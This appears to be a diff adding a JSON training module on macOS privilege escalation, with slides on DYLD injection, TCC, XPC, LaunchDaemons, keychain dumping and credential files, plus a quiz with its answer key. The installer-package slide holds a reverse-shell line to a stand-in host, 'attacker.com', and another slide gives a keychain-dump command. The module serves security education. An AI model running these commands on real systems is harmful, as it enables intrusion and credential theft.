@@ -1,0 +1,113 @@
+{
+    "id": "learn_macos_priv_esc",
+    "topicId": "macos_priv_esc",
+    "topicTitle": "macOS Privilege Escalation",
+    "description": "Techniques for elevating privileges on macOS, bypassing Gatekeeper, TCC, and SIP.",
+    "baseKP": 100,
+    "slides": [
+        {
+            "id": "macos_priv_intro_1",
+            "type": "content",
+            "title": "Escalating on the Apple 🍏",
+            "content": "# Distinctly Different\n\nmacOS (BSD-based) shares some roots with Linux but adds many unique barriers.\n\n## The Barriers\n-   **SIP**: Even Root isn't God.\n-   **TCC**: User must click \"Yes\" for everything.\n-   **Sandboxing**: Apps are contained.\n\nPrivEsc is often about bypassing TCC to get user data, or kernel exploits to bypass SIP."
+        },
+        {
+            "id": "dyld_hijacking",
+            "type": "content",
+            "title": "DYLD Hijacking",
+            "content": "# DYLD Library Injection 💉\n\nSimilar to DLL hijacking on Windows.\n\n## Environment Variables\n-   `DYLD_INSERT_LIBRARIES`: Forces a binary to load a specific dylib.\n-   **Protection**: macOS ignores these variables for binaries signed with `Com.apple.security.cs.disable-library-validation` Entitlement (or SIP protected binaries).\n-   **Attack**: Find signed binaries *without* the Hardened Runtime that allow library injection."
+        },
+        {
+            "id": "periodic_scripts",
+            "type": "content",
+            "title": "Periodic Scripts",
+            "content": "# Periodic Scripts 🕰️\n\nmacOS maintenance scripts (daily, weekly, monthly).\n\n-   Location: `/etc/periodic/`\n-   **Attack**: If you can write to these folders (misconfiguration), your script runs as root when the system performs maintenance."
+        },
+        {
+            "id": "installer_packages",
+            "type": "content",
+            "title": "Installer Packages (PKG)",
+            "content": "# Malicious PKGs 📦\n\nmacOS installers (`.pkg`) can run \"pre-install\" and \"post-install\" scripts as **Root**.\n\n## Scenario\n-   Attacker convincing user to install a tool.\n-   User authenticates (GUI prompt).\n-   Script runs: `#!/bin/bash` -> `nc -e /bin/bash attacker.com 4444`.\n-   Result: Immediate Root shell."
+        },
+        {
+            "id": "sudo_cve",
+            "type": "content",
+            "title": "Sudo Vulnerabilities",
+            "content": "# Sudo on macOS 🦁\n\nmacOS uses `sudo`, so it inherits standard sudo bugs.\n\n## CVE-2021-3156 (Baron Samedit)\n-   Heap overflow in sudo.\n-   Allowed unprivileged users to overwrite memory and execute code as root.\n-   Effective on older macOS versions."
+        },
+        {
+            "id": "xpc_exploitation",
+            "type": "content",
+            "title": "XPC Exploitation",
+            "content": "# XPC: Inter-Process Communication 🗨️\n\nHow apps talk to each other (and to services).\n\n## The Flaw\n-   Detailed: A privileged \"Helper Tool\" (runs as Root) accepts messages from a regular App.\n-   **Attack**: Send a malformed message to the Helper Tool to trick it into executing a command or writing a file.\n-   **Tool**: `XPCSpy`."
+        },
+        {
+            "id": "tcc_db_modification",
+            "type": "content",
+            "title": "TCC.db Modification",
+            "content": "# Modifying TCC.db 🕵️\n\nThe Holy Grail of macOS User Privacy.\n\n-   Path: `~/Library/Application Support/com.apple.TCC/TCC.db`\n-   **Goal**: Insert a row granting your Terminal app `Full Disk Access`.\n-   **Barrier**: The file itself is protected by SIP/TCC. You need a bypass to edit the database that controls the bypass."
+        },
+        {
+            "id": "keychain_dumping",
+            "type": "content",
+            "title": "Keychain Dumping",
+            "content": "# Dumping Keychain 🔑\n\nRetrieving stored passwords.\n\n-   **Security**: Use `security dump-keychain -d login.keychain`.\n-   **Prompt**: This usually triggers a GUI prompt to the user.\n-   **Bypass**: Some exploits (like `chainbreaker`) try to extract the master key from memory or analysis of the keychain file directly to bypass prompts."
+        },
+        {
+            "id": "electron_apps",
+            "type": "content",
+            "title": "Electron App Injection",
+            "content": "# Hacking Electron apps ⚛️\n\nMany macOS apps are Electron (Slack, Discord, VSCode).\n\n-   **Debug Mode**: If launched with `--inspect`, you can attach a debugger and execute code in the context of the app.\n-   If the app has TCC permissions (Mic/Cam), you inherit them."
+        },
+        {
+            "id": "kernel_extensions_kext",
+            "type": "content",
+            "title": "Kext Vulnerabilities",
+            "content": "# Kext Exploits 🧩\n\nThird-party Kernel Extensions.\n\n-   Drivers for Antivirus or Firewalls running in Ring 0.\n-   If the driver has a bug, you can exploit it to get Kernel Code Execution.\n-   Apple is aggressively deprecating Kexts in favor of System Extensions for this reason."
+        },
+        {
+            "id": "macos_quiz",
+            "type": "quiz",
+            "title": "macOS Quiz",
+            "content": "Check your knowledge.",
+            "quizQuestion": "What is the name of the inter-process communication mechanism on macOS that is often targeted for privilege escalation?",
+            "quizOptions": [
+                "DCOM",
+                "XPC",
+                "Named Pipes",
+                "DBus"
+            ],
+            "correctOptionIndex": 1
+        },
+        {
+            "id": "automating_macos",
+            "type": "content",
+            "title": "Automation Tools",
+            "content": "# Tools suitable for Mac 🧰\n\n-   **LinPEAS**: Has a macOS mode, though less comprehensive.\n-   **SwiftBelt**: A macOS specific enumeration tool (inspired by Seatbelt).\n    -   Checks: TCC status, Gatekeeper status, History, Keys, Credentials."
+        },
+        {
+            "id": "creds_files",
+            "type": "content",
+            "title": "Credential Hunting",
+            "content": "# Mac-Specific files 📂\n\n-   `.bash_history`, `.zsh_history`: Frequent source of passwords.\n-   `~/Library/Keychains/`: The vault.\n-   `~/Library/Cookies/`: Browser cookies (Safari).\n-   `~/Library/Messages/`: iMessage database (chat history)."
+        },
+        {
+            "id": "launch_daemons",
+            "type": "content",
+            "title": "LaunchDaemons",
+            "content": "# Persistence & PrivEsc 🚀\n\nServices starting at boot.\n\n-   `/Library/LaunchDaemons/`: Run as **Root**.\n-   `/Library/LaunchAgents/`: Run as **User**.\n-   **Attack**: If you verify misconfigured file permissions on a plist in `LaunchDaemons`, point it to your binary. Next reboot -> Root."
+        },
+        {
+            "id": "rootpipe_history",
+            "type": "content",
+            "title": "Admin to Root",
+            "content": "# Admin != Root ⚠️\n\nOn macOS, an \"Admin\" user is just a user in the `wheel` group who *can* use sudo.\n\nHistorically, vulnerabilities like **Rootpipe** allowed Admins to escalate to Root **without** knowing the password, by abusing XPC services that didn't verify authorization correctly."
+        },
+        {
+            "id": "macos_priv_esc_summary",
+            "type": "content",
+            "title": "Module Summary",
+            "content": "# Wrap Up 🎁\n\n-   **XPC**: The main attack surface for logic bugs.\n-   **TCC**: The privacy guard you must bypass.\n-   **LaunchDaemons**: The path to persistence and root.\n-   **Enumeration**: SwiftBelt is your friend.\n\nMac hardening makes it tough, but complexity breeds bugs."
+        }
+    ]
+}
